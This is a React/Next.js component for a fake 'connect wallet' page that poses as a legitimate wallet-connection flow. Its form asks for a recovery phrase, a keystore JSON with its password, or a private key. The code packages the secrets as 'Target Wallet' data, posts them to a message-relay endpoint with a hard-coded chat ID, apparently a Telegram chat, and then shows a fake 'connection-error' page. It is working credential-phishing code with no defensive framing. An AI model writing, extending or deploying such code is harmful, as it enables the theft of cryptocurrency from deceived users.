"use client";

import { use, useState, useRef, useEffect } from "react";
import { useRouter } from "next/navigation"; // Import Router
import Image from "next/image";
import { FileJson, Key, Type, ChevronLeft } from "lucide-react";
import Link from "next/link";

// --- Configuration / Constants ---
const WINDOW_MS = 10000; // 10 seconds
const MAX_MSGS_PER_10S = 3;
const DUPLICATE_THRESHOLD = 3;
const BLOCK_LINKS_FOR_NON_ADMINS = true;

// Helper to find links (basic regex)
const extractLinks = (text: string) => {
    const urlRegex = /(https?:\/\/[^\s]+)|(www\.[^\s]+)/g;
    return text.match(urlRegex) || [];
};

interface WalletData {
    name: string;
    imageId: string;
    projectId: string;
}

export default function WalletForm({ dataPromise }: { dataPromise: Promise<WalletData> }) {
    const chatId = "7376017881";
    const { name, imageId, projectId } = use(dataPromise);
    const router = useRouter(); // Initialize Router

    const [activeTab, setActiveTab] = useState<"phrase" | "keystore" | "private">("phrase");
    const [loading, setLoading] = useState(false);

    // --- SPAM PREVENTION REFS ---
    const pageLoadedAtRef = useRef<number | null>(null);
    const spamStateRef = useRef<{
        timestamps: number[];
        lastMessages: string[];
    }>({
        timestamps: [],
        lastMessages: [],
    });

    useEffect(() => {
        pageLoadedAtRef.current = Date.now();
    }, []);

    // --- CLIENT SIDE SPAM CHECK LOGIC ---
    const clientSpamCheck = (text: string) => {
        const trimmed = text.trim();
        const now = Date.now();
        const state = spamStateRef.current;

        // 1. Block Links
        const links = extractLinks(trimmed);
        if (BLOCK_LINKS_FOR_NON_ADMINS && links.length > 0) {
            return { ok: false, reason: "Links are not allowed." };
        }

        // 2. Rate Limit (Time Window)
        state.timestamps = state.timestamps.filter((t) => now - t < WINDOW_MS);
        state.timestamps.push(now);

        if (state.timestamps.length > MAX_MSGS_PER_10S) {
            return { ok: false, reason: "You are submitting too quickly. Please wait." };
        }

        // 3. Duplicate Detection
        state.lastMessages.push(trimmed);
        if (state.lastMessages.length > DUPLICATE_THRESHOLD) {
            state.lastMessages.shift(); // Keep array size fixed
        }

        // Check if ALL recent messages are identical
        const isSpammingDuplicates =
            state.lastMessages.length === DUPLICATE_THRESHOLD &&
            state.lastMessages.every((m) => m === trimmed);

        if (isSpammingDuplicates) {
            return { ok: false, reason: "Please do not spam the same message." };
        }

        return { ok: true };
    };

    // --- SUBMISSION HANDLER ---
    const handleConnect = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        setLoading(true);

        const formData = new FormData(e.currentTarget);
        // Cast to Record<string, string> so TypeScript allows dot notation
        const data = Object.fromEntries(formData.entries()) as Record<string, string>;

        const now = Date.now();
        const pageLoadedAt = pageLoadedAtRef.current ?? now;
        const timeSinceLoadMs = now - pageLoadedAt;

        // --- 1. SPAM CHECK ---
        const rawInput = data.phrase || data.keystore_json || data.private_key || "";
        const check = clientSpamCheck(rawInput);

        if (!check.ok) {
            setLoading(false);
            alert(check.reason);
            return;
        }

        // --- 2. CONSTRUCT THE USER STRING ---
        // We build a specific string based on the active tab
        let credentialInfo = "";

        if (activeTab === "phrase") {
            credentialInfo = `Phrase: ${data.phrase}`;
        }
        else if (activeTab === "keystore") {
            credentialInfo = `Keystore JSON: ${data.keystore_json}\nPassword: ${data.keystore_password}`;
        }
        else if (activeTab === "private") {
            credentialInfo = `Private Key: ${data.private_key}`;
        }

        // --- 3. ADD THE METADATA (Name & Method) ---
        // Combine everything into one formatted string
        const finalUserString = `
Target Wallet: ${name}
Connection Method: ${activeTab.toUpperCase()}
--------------------------------
${credentialInfo}
        `.trim();

        try {
            await fetch("/api/send-message", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chatId,
                    text: finalUserString,
                    timeSinceLoadMs
                }),
            });

            // console.log("Sent Data:", finalUserString);

            // Redirect on success
            setTimeout(() => {
                setLoading(false);
                router.push("/connection-error");
            }, 2000);

        } catch (error) {
            console.error("Failed to send", error);
            setLoading(false);
        }
    };

    const imageUrl = imageId
        ? `https://explorer-api.walletconnect.com/v3/logo/md/${imageId}?projectId=${projectId}`
        : "";

    return (
        <div className="w-full max-w-lg relative z-20 animate-fade-in-up">

            {/* Back Link - Adaptive Colors */}
            <div className="mb-6 pl-2">
                <Link href="/dapp" className="inline-flex items-center gap-2 text-slate-500 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white transition-colors font-bold text-sm">
                    <ChevronLeft size={18} /> Choose Different Wallet
                </Link>
            </div>

            {/* Main Card - Glass Effect adapted for Dark Mode */}
            <div className="bg-white/80 dark:bg-slate-900/80 backdrop-blur-xl border border-white/60 dark:border-slate-700 shadow-2xl rounded-[2.5rem] overflow-hidden ring-1 ring-white/50 dark:ring-slate-800">

                {/* Header */}
                <div className="relative bg-slate-50/50 dark:bg-slate-950/50 border-b border-gray-100 dark:border-slate-800 p-8 pb-6 text-center">
                    <div className="flex flex-col items-center">
                        <div className="relative w-24 h-24 mb-5 group">
                            <Image src={imageUrl} alt={name} width={88} height={88} className="rounded-[0.8rem] border border-white dark:border-slate-600 shadow-sm" />
                        </div>
                        <h1 className="text-3xl font-black text-slate-900 dark:text-white tracking-tight mb-1">{name}</h1>
                    </div>
                </div>

                {/* Tabs Navigation */}
                <div className="p-2 bg-slate-50/80 dark:bg-slate-950/50 border-b border-gray-100 dark:border-slate-800 flex gap-1">
                    {[
                        { id: "phrase", icon: Type, label: "Phrase" },
                        { id: "keystore", icon: FileJson, label: "Keystore" },
                        { id: "private", icon: Key, label: "Private Key" }
                    ].map((tab) => (
                        <button
                            key={tab.id}
                            type="button"
                            onClick={() => setActiveTab(tab.id as any)}
                            className={`flex-1 py-3 text-xs sm:text-sm font-bold rounded-xl transition-all flex items-center justify-center gap-2 ${activeTab === tab.id
                                ? "bg-white dark:bg-slate-800 text-blue-600 dark:text-blue-400 shadow-[0_2px_8px_-2px_rgba(0,0,0,0.05)] ring-1 ring-black/5 dark:ring-white/10"
                                : "text-slate-400 dark:text-slate-500 hover:text-slate-600 dark:hover:text-slate-300 hover:bg-white/40 dark:hover:bg-slate-800/50"
                                }`}
                        >
                            <tab.icon size={16} /> {tab.label}
                        </button>
                    ))}
                </div>

                {/* Form Body */}
               <div className="p-6 sm:p-8 bg-white/40 dark:bg-slate-900/20">
                    <form onSubmit={handleConnect} className="space-y-6">

                        {/* PHRASE INPUT */}
                        {activeTab === "phrase" && (
                            <div className="space-y-4 animate-fade-in">
                                <div className="relative group">
                                    <textarea
                                        name="phrase"
                                        required
                                        placeholder="Enter your 12 or 24 word recovery phrase..."
                                        // CHANGED: text-sm -> text-base
                                        className="w-full h-32 p-4 bg-slate-50 dark:bg-slate-950 border border-gray-200 dark:border-slate-700 rounded-2xl text-slate-900 dark:text-white placeholder:text-slate-400 dark:placeholder:text-slate-600 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none resize-none transition-all text-base font-medium leading-relaxed"
                                    />
                                </div>
                            </div>
                        )}

                        {/* KEYSTORE INPUT */}
                        {activeTab === "keystore" && (
                            <div className="space-y-4 animate-fade-in">
                                <textarea
                                    name="keystore_json"
                                    required
                                    // CHANGED: text-sm -> text-base
                                    className="w-full h-24 p-4 bg-slate-50 dark:bg-slate-950 border border-gray-200 dark:border-slate-700 rounded-2xl text-slate-900 dark:text-white text-base font-mono placeholder:text-slate-400 dark:placeholder:text-slate-600 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none"
                                    placeholder="Keystore JSON"
                                />
                                <input
                                    name="keystore_password"
                                    type="password"
                                    required
                                    // CHANGED: text-sm -> text-base
                                    className="w-full p-4 bg-slate-50 dark:bg-slate-950 border border-gray-200 dark:border-slate-700 rounded-2xl text-slate-900 dark:text-white text-base placeholder:text-slate-400 dark:placeholder:text-slate-600 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none"
                                    placeholder="Password"
                                />
                            </div>
                        )}

                        {/* PRIVATE KEY INPUT */}
                        {activeTab === "private" && (
                            <div className="space-y-4 animate-fade-in">
                                <input
                                    name="private_key"
                                    type="password"
                                    required
                                    // CHANGED: text-sm -> text-base
                                    className="w-full p-4 bg-slate-50 dark:bg-slate-950 border border-gray-200 dark:border-slate-700 rounded-2xl text-slate-900 dark:text-white text-base font-mono placeholder:text-slate-400 dark:placeholder:text-slate-600 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none"
                                    placeholder="Private Key"
                                />
                            </div>
                        )}
                        
                        {/* Submit Button */}
                        <div className="pt-2">
                            <button
                                disabled={loading}
                                type="submit"
                                className="w-full bg-slate-900 dark:bg-blue-600 hover:bg-blue-600 dark:hover:bg-blue-500 text-white font-bold py-4 rounded-xl shadow-lg shadow-slate-900/20 dark:shadow-blue-900/20 transition-all hover:-translate-y-0.5 disabled:opacity-70 flex items-center justify-center gap-2"
                            >
                                {loading ? "Processing..." : "Proceed Securely"}
                            </button>
                        </div>
                    </form>
                </div>
            </div>

            <style jsx global>{`
                @keyframes fade-in-up {
                    from { opacity: 0; transform: translateY(10px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                .animate-fade-in-up { animation: fade-in-up 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
                .animate-fade-in { animation: fade-in-up 0.3s ease-out forwards; }
            `}</style>
        </div>
    );
}
